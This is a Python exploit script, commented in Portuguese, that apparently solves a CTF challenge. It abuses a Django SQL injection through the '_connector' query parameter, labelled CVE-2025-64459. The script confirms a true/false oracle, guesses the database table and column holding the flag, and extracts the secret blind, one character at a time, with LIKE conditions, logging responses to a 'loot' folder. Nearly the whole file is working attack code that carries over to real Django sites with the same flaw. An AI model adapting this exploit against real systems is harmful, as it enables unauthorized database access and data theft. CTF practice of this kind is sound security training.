#!/usr/bin/env python3
import json
import re
from pathlib import Path

import requests
import urllib3

# Remove warnings de HTTPS em ambiente CTF.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://c5f31ca2b741d1b6.chal.ctf.ae"
OUTDIR = Path("loot")
OUTDIR.mkdir(exist_ok=True)

session = requests.Session()
session.verify = False

flag_re = re.compile(r"flag\{[^}\r\n]+\}", re.IGNORECASE)


def sql_string(value: str) -> str:
    """
    Escapa string para uso dentro do payload SQL.
    Como estamos montando uma condição SQL injetada no _connector,
    precisamos evitar quebrar aspas simples.
    """
    return "'" + value.replace("'", "''") + "'"


def request_with_connector(condition: str, label: str):
    """
    Abusa do CVE-2025-64459.

    O Django monta algo parecido com:

        WHERE (author = ? <CONNECTOR> title = ?)

    Se _connector for:
        ) OR (<condição>) OR (

    o WHERE vira logicamente:

        WHERE (author = ?) OR (<condição>) OR (title = ?)

    Como author e title recebem valores impossíveis, o resultado passa
    a depender somente da condição injetada.
    """
    connector = f") OR ({condition}) OR ("

    params = {
        "author": "__nao_existe_author__",
        "title": "__nao_existe_title__",
        "_connector": connector,
    }

    response = session.get(
        TARGET + "/api/surveys/",
        params=params,
        timeout=15,
    )

    out_file = OUTDIR / f"script4_{label}.txt"
    out_file.write_text(
        "CONDITION:\n"
        + condition
        + "\n\nURL:\n"
        + response.url
        + "\n\nSTATUS:\n"
        + str(response.status_code)
        + "\n\nBODY:\n"
        + response.text,
        encoding="utf-8",
        errors="replace",
    )

    try:
        data = response.json()
        count = int(data.get("count", -1))
    except Exception:
        data = None
        count = -1

    print()
    print("=" * 100)
    print(label)
    print("STATUS:", response.status_code)
    print("COUNT:", count)
    print("LEN:", len(response.text))
    print("BODY:", response.text[:500])

    return response.status_code, count, response.text


def oracle(condition: str, label: str = "oracle") -> bool:
    """
    Retorna True quando a condição SQL injetada faz a API retornar surveys.
    Retorna False quando a condição não bate.
    """
    status, count, body = request_with_connector(condition, label)

    # Se achar a flag direto por algum motivo, salva.
    m = flag_re.search(body)
    if m:
        flag = m.group(0)
        print("[+] FLAG ENCONTRADA DIRETO:", flag)
        Path("flag.txt").write_text(flag + "\n", encoding="utf-8")
        raise SystemExit(0)

    return status == 200 and count > 0


def find_adminnote_table() -> str:
    """
    O app Django se chama surveys e o model se chama AdminNote.
    O nome padrão da tabela tende a ser surveys_adminnote.
    Mesmo assim testamos variações para evitar travar por detalhe de deploy.
    """
    candidates = [
        "surveys_adminnote",
        "survey_adminnote",
        "adminnote",
        "admin_note",
        "admin_notes",
    ]

    for table in candidates:
        condition = f"EXISTS(SELECT 1 FROM {table})"
        ok = oracle(condition, f"table_probe_{table}")
        if ok:
            print("[+] Tabela encontrada:", table)
            return table

    print("[-] Nenhuma tabela AdminNote candidata respondeu como existente.")
    raise SystemExit(1)


def find_flag_column(table: str) -> str:
    """
    Testa as colunas prováveis do AdminNote.
    Pelo source, as colunas são key e value.
    A flag provavelmente está no value, mas validamos as duas.
    """
    columns = ["value", "key"]

    for column in columns:
        condition = f"EXISTS(SELECT 1 FROM {table} WHERE {column} LIKE '%flag{{%')"
        ok = oracle(condition, f"column_probe_{table}_{column}")
        if ok:
            print("[+] Coluna com flag:", column)
            return column

    print("[-] Não encontrei flag começando com flag{ em key/value.")
    print("[*] Vou tentar extração por value mesmo, porque é o campo mais provável.")
    return "value"


def extract_flag_by_like(table: str, column: str) -> str:
    """
    Extração cega por prefixo.

    A cada caractere, testamos:
        EXISTS(SELECT 1 FROM surveys_adminnote WHERE value LIKE '%flag{a%')

    Quando o prefixo correto existe em algum valor, a API retorna count > 0.
    """
    prefix = "flag{"

    # Flags da Fluid normalmente são hex, mas deixamos fallback amplo.
    primary_charset = "0123456789abcdef}"
    fallback_charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}"

    print()
    print("=" * 100)
    print("EXTRAÇÃO CEGA DA FLAG")
    print("=" * 100)
    print("[*] Prefixo inicial:", prefix)

    for position in range(1, 80):
        found = False

        charset = primary_charset
        for ch in charset:
            candidate = prefix + ch
            condition = f"EXISTS(SELECT 1 FROM {table} WHERE {column} LIKE '%{candidate}%')"

            if oracle(condition, f"extract_pos_{position}_{ord(ch)}"):
                prefix = candidate
                print("[+] Prefixo:", prefix)
                found = True
                break

        if not found:
            print("[*] Charset hex não achou próximo caractere. Tentando fallback amplo.")

            for ch in fallback_charset:
                candidate = prefix + ch
                condition = f"EXISTS(SELECT 1 FROM {table} WHERE {column} LIKE '%{candidate}%')"

                if oracle(condition, f"extract_fallback_pos_{position}_{ord(ch)}"):
                    prefix = candidate
                    print("[+] Prefixo:", prefix)
                    found = True
                    break

        if prefix.endswith("}"):
            return prefix

        if not found:
            print("[-] Não foi possível avançar a partir do prefixo:", prefix)
            break

    return prefix


def main():
    print("[*] Target:", TARGET)

    print()
    print("=" * 100)
    print("VALIDANDO SQLI VIA _connector")
    print("=" * 100)

    true_ok = oracle("1=1", "sqli_true_1_eq_1")
    false_ok = oracle("1=0", "sqli_false_1_eq_0")

    print()
    print("[*] Resultado 1=1:", true_ok)
    print("[*] Resultado 1=0:", false_ok)

    if not true_ok or false_ok:
        print("[-] O comportamento não confirmou o oráculo esperado.")
        print("[*] Revise loot/script4_sqli_true_1_eq_1.txt e loot/script4_sqli_false_1_eq_0.txt")
        raise SystemExit(1)

    print("[+] SQLi confirmado via _connector.")

    table = find_adminnote_table()
    column = find_flag_column(table)

    flag = extract_flag_by_like(table, column)

    print()
    print("=" * 100)
    print("RESULTADO")
    print("=" * 100)

    if flag_re.fullmatch(flag):
        print("[+] FLAG ENCONTRADA:", flag)
        Path("flag.txt").write_text(flag + "\n", encoding="utf-8")
        print("[+] Flag salva em flag.txt")
    else:
        print("[!] Extração parcial:", flag)
        print("[*] Revisar arquivos em loot/script4_*.txt")


if __name__ == "__main__":
    main()
